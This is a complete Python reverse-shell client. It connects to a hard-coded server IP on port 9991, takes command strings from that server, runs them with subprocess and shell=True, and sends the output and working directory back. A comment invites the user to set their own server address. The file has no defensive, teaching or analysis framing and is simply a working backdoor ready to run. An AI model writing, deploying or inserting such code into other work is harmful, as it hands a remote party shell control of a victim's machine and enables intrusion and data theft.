import socket
import os
import subprocess
import sys

# Create a socket
soc = socket.socket()
host = "172.31.107.189"  # Change this to your server's IP
port = 9991

try:
    soc.connect((host, port))
except socket.error as e:
    print(f"Connection error: {e}")
    sys.exit()

while True:
    try:
        data = soc.recv(2048)  # Receiving data from server (increased buffer size)
        if len(data) == 0:  # Handle disconnection
            print("Server connection closed")
            break

        # Handle 'cd' command to change directories
        if data[:2].decode("utf-8") == "cd":
            try:
                os.chdir(data[3:].decode("utf-8"))
            except Exception as e:
                soc.send(str.encode(f"Error: {str(e)}\n"))
                continue

        # Execute other commands
        if len(data) > 0:
            cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            currentWD = os.getcwd() + ">"
            soc.send(str.encode(output_str + currentWD))

            print(output_str)

    except Exception as e:
        print(f"Error during data receiving/command execution: {e}")
        break

soc.close()
